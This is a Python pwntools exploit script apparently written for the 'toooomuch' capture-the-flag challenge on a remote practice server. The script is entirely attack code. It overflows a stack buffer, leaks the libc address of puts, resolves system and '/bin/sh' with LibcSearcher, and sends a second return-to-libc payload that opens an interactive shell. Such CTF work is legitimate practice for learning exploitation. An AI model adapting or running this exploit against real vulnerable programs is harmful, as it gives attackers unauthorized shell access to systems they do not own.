#!/usr/bin/env python2
from pwn import *
from LibcSearcher import *
import os
context.log_level = "debug"
context(arch = "i386",os = "linux")

p = remote("hackme.inndy.tw", 7702)
#p = process('./toooomuch')
elf = ELF('./toooomuch')
p.recvuntil("Give me your passcode: ")

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
toooomuch_func = elf.sym['toooomuch']
payload = 0x18*'z'+p32(0)+p32(puts_plt)+p32(toooomuch_func)+p32(puts_got)
p.sendline(payload)
p.recvuntil("You are not allowed here!\n")
puts_libc = u32(p.recv(4))

libc = LibcSearcher('puts', puts_libc)
libc_base = puts_libc - libc.dump('puts')
system_libc = libc_base + libc.dump('system')
binsh_libc = libc_base + libc.dump('str_bin_sh')
p.recvuntil("Give me your passcode: ")

payload = 0x18*'z'+p32(0)+p32(system_libc)+p32(toooomuch_func)+p32(binsh_libc)
p.sendline(payload)

p.interactive()
